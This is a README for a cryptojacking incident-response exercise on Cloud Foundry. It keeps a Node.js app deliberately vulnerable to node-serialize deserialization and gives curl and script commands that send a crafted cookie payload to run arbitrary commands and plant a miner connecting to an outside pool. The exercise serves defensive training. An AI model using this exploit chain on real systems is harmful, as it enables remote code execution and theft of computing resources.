## A cryptojacking incident response excercise for Cloud Foundry

This was inspired by, and originally forked from, code in https://github.com/mfdii/miner-blog, by [Michael Ducy](https://twitter.com/mfdii). That code accompanies [this blog post](https://sysdig.com/blog/detecting-cryptojacking-with-sysdigs-falco/), on Detecting Cryptojacking with Sysdig's [Falco](https://github.com/draios/falco).

I munged it for use in an incident response exercise with Cloud Foundry. It uses an Immediately-Invoked Function Expression attack on a NodeJS application to run arbitrary code in a container. The vulnerable application is in `node-exploitable/`, and relies on [node-serialize 0.0.4](https://github.com/luin/serialize) which has a [known, unpatched, 2017 CVE](https://www.cvedetails.com/vulnerability-list/vendor_id-16128/product_id-36008/version_id-208749/Node-serialize-Project-Node-serialize-0.0.4.html). As a result, I see this 
![warning in GitHub](./node-serialize-warning.png):

> ⚠️ We found a potential security vulnerability in one of your dependencies. A dependency defined in node-exploitable/package-lock.json has known security vulnerabilities and should be updated.

Clearly I'm not updating it or the whole exercise won't work.

For this scenario, I injected a `miner/`, which uses a [Node stratum-client](https://github.com/arnabk/stratum-client) to connect to a mining pool over port 3333, then it simulated mining activity by running [bcrypt](https://github.com/dcodeIO/bcrypt.js) to burn CPU.

I also experimented with using [cpulimit](https://github.com/opsengine/cpulimit), so the linked executable for Ubuntu 14.04 is in `miner/cl`.

Lastly, I thought I'd make things even harder by having other Node apps that just happened to a lot of CPU for every web request in `node-decoy/`.

## Local demo

Window 1:

```bash
cd ./node-exploitable
npm install
npm start
...
```

Window 2:

```bash
payload=$(printf "ls -l /" | ./nodejspayload.py | base64)
curl -b "profile=$payload" -vs http://localhost:8000
```

Window 1 should then show the `ls -l /` results for the server

### Cloud Foundry demo

Push the expoitable client:

```bash
cd ./node-exploitable
cf push
cf logs hello-iife
```

```bash
./exploit-it.sh
```

Then `cf ssh hello-iife`. You should see the code in `/tmp/miner` and that `lsof -i` shows a connection to the mining pool.

```
node      160 vcap   10u  IPv4 22662477      0t0  TCP 1cefe2b8-25f0-418b-4e92-96da:53330->pool1.grlcgang.com:3333 (ESTABLISHED)
```

Meanwhile, `cf app hello-iife` should show one of the two instances burning a lot of CPU:

```
type:           web
instances:      2/2
memory usage:   64M
     state     since                  cpu     memory         disk
#0   running   2018-08-15T14:04:37Z   97.9%   54.6M of 64M   78.2M of 256M
#1   running   2018-08-15T14:04:37Z   0.0%    35.2M of 64M   72.5M of 256M
```